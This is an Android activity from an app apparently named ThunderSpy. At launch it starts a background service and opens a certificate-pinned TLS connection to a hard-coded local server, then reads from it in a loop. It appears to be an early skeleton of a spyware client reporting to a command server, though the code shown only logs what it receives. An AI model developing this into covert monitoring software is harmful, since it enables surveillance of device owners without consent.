package com.thunderspy.spy;

import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import com.thunderspy.spy.utils.Utils;

import java.io.InputStream;
import java.io.OutputStream;
import java.security.cert.CertificateException;
import java.security.cert.CertificateExpiredException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final TextView tv = (TextView)findViewById(R.id.tv);

        startService(new Intent(getApplicationContext(), WorkerService.class));
        Utils.log("lihkhkhk");

        final Thread th = new Thread(new Runnable() {
            @Override
            public void run() {
                try {


                    CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509");
                    final X509Certificate certificate = (X509Certificate)certificateFactory.generateCertificate(getAssets().open("cert/public-cert.pem"));


                    try {
                        throw new CertificateExpiredException("lkjl");
                    } catch (Exception x ) {
                        Log.d("APP", x.getMessage());
                    }

                    SSLContext sslContext = SSLContext.getInstance("TLS");
                    TrustManager tm = new X509TrustManager() {
                        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
                            Log.d("APP", "checking client");
                        }

                        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
                            for (X509Certificate cert : chain) {
                                Log.d("APP", "S");
                                if(cert.equals(certificate)) {
                                    return;
                                }
                            }
                            throw new CertificateException("Not Matched");
                        }

                        public X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }
                    };

                    sslContext.init(null, new TrustManager[] { tm }, null);

                    SSLSocketFactory socketFactory = sslContext.getSocketFactory();
                    SSLSocket sslSocket = (SSLSocket)socketFactory.createSocket("192.168.1.102", 8000);
                    sslSocket.startHandshake();

                    InputStream is = sslSocket.getInputStream();
                    OutputStream os = sslSocket.getOutputStream();

                    while (true) {
                        int r = is.read();
                        Utils.log(r);
                    }





                } catch (Exception exp) {
                    Log.d("APP", exp.getMessage());
                }
            }
        });

        final Thread th1 = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Utils.log(Utils.getServerActualCertificate(getApplicationContext()));
                    //Utils.log(Thread.currentThread().isAlive());
                } catch (Exception exp) {
                    Utils.log(exp);

                }
            }
        });
        th1.start();
        Utils.log(th1.isAlive());
        final Handler h = new Handler(Looper.getMainLooper());
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                Utils.log(th1.isAlive());
                h.postDelayed(this, 100000);
            }
        }, 10000);

    }
}
